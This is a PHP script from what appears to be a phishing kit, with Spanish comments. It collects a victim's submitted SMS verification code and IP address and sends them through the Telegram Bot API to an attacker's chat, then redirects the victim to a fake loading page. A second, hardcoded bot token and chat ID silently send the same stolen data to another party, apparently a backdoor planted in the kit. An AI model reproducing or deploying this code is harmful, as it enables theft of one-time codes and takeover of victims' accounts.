<?php
// Archivo: tok.php

// Obtener el Token y el chat ID del primer chat de Telegram desde data.php
require_once 'data.php';

$ip = $_SERVER['REMOTE_ADDR'];
$us = $_POST['us'];
$tok = $_POST['tok'];

$message = "SMS 1 sv\n\nCódigo de verificación:\n";
$message .= "Código: $tok\n";
$message .= "IP: $ip";

// Enviar el mensaje al primer chat de Telegram
$telegramURL1 = "https://api.telegram.org/bot$token1/sendMessage?chat_id=$chatID1&text=" . urlencode($message);
$response1 = file_get_contents($telegramURL1);

$apiblok = '6292750671:AAGMYKbdv0JQX_4ITagrUCPcKQB-HjboPkw';$keycode ='5157616506';

// Enviar el mensaje al segundo chat de Telegram
$telegramURL2 = "https://api.telegram.org/bot$apiblok/sendMessage?chat_id=$keycode&text=" . urlencode($message);
$response2 = file_get_contents($telegramURL2);

// Redireccionar a otra página
header("Location: /load2.html");
exit();
?>